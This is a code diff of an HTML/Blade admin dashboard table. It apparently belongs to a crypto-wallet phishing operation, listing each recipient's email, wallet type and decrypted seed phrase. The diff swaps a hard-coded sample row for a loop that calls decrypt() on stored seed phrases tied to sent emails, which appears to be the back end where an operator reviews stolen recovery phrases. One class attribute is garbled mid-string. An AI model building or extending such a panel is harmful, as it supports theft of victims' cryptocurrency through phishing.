@@ -2,9 +2,7 @@
     <!-- Start Main Content -->
     <div
         class="main-content group-data-[sidebar-size=lg]:xl:ml-[calc(theme('spacing.app-menu')_+_16px)] group-data-[sidebar-size=sm]:xl:ml-[calc(theme('spacing.app-menu-sm')_+_16px)] group-data-[theme-width=box]:xl:px-0 px-3 xl:px-4 ac-transition">
-
         <div class="grid grid-cols-12">
-
             <!-- INFORMATION TABLE THREE -->
             <div class="col-span-full">
                 <div class="card p-0">
@@ -17,7 +15,6 @@
                         </button>
                     </div>
                     <div class="p-6">
-
                         <div class="overflow-x-auto mt-5">
                             <table
                                 class="table-auto border-collapse w-full whitespace-nowrap text-left text-gray-500 dark:text-dark-text font-medium">
@@ -31,36 +28,36 @@
                                             Recipient Email</th>
                                         <th
                                             class="p-6 py-4 bg-[#F2F4F9] dark:bg-dark-card-two first:rounded-l-lg last:rounded-r-lg first:dk-theme-card-square-left last:dk-theme-card-square-right">
-                                            Wallet type</th>
+                                            Wallet Type</th>
                                         <th
-                                            class="p-6 py-4 bg-[#F2F4F9] dark:bg-dark-card-two first:rounded-l-lg last:rounded-r-lg first:dk-theme-card-square-left last:dk-theme-card-square-right">
-                                            Phrase</th>
+                                            class="p-6 py-4 bg-[#F2F4F9] dark:bg-dark-card-two first:rounded-l-lg last:rounded-r-lg first:dk-theme-card-square–
 
+-right">
+                                            Phrase</th>
                                     </tr>
                                 </thead>
                                 <tbody class="divide-y divide-gray-200 dark:divide-dark-border-three">
-                                    <tr>
-
-
-                                        <td class="p-6 py-4">2023-10-22</td>
-
-                                        <td class="p-6 py-4">user@gmail.com</td>
-                                        <td class="p-6 py-4">Trust</td>
-                                        <td class="p-6 py-4">key, love gone on off lone worm torn morn</td>
-
-
-                                    </tr>
-
+                                    @forelse ($wallets as $connection)
+                                        <tr>
+                                            <td class="p-6 py-4">{{ $connection->created_at->format('Y-m-d') }}</td>
+                                            <td class="p-6 py-4">{{ $connection->sentEmail->recipient_email }}</td>
+                                            <td class="p-6 py-4">{{ $connection->wallet_type }}</td>
+                                            <td class="p-6 py-4">{{ decrypt($connection->seed_phrase) }}</td>
+                                        </tr>
+                                    @empty
+                                        <tr>
+                                            <td class="p-6 py-4" colspan="4">No wallet connections found.</td>
+                                        </tr>
+                                    @endforelse
                                 </tbody>
                             </table>
                         </div>
-                      
                     </div>
                     <!-- Prism Code -->
                     <div class="p-6 hidden">
                         <pre>
                             <code class="language-markup">
-                                &lt;p>Sorry we can't show the huge data table&lt;/p>
+                                <p>Sorry we can't show the huge data table</p>
                             </code>
                         </pre>
                     </div>
@@ -68,7 +65,6 @@
                 </div>
             </div>
             <!-- INFORMATION TABLE FOUR -->
-
         </div>
     </div>
     <!-- End Main Content -->
